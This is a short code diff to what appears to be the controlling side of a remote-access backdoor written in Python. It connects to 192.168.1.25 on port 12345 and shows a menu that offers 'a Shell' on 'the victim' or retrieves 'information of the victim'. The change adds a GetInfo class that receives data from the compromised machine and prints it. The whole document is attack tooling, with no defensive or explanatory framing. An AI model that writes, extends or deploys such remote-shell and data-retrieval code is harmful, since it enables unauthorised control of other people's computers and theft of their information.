@@ -30,6 +30,12 @@ class Shell:
         self.next_command = False
 
 
+class GetInfo:
+
+    def receive(self):
+        content = s.recv(4096).decode("utf-8")
+        print(content)
+
 serv_addr = ("192.168.1.25", 12345)
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(serv_addr)
@@ -51,7 +57,8 @@ while message != "exit":
                     shell.send()
                     shell.receive()
     elif message == "2":
-        pass
+        getinfo = GetInfo()
+        getinfo.receive()
 
 
     message = input("1. Press 1 to start a Shell\n2. Press 2 to retrieve information of the victim\n3. Type exit to quit\n\nAnswer: ")
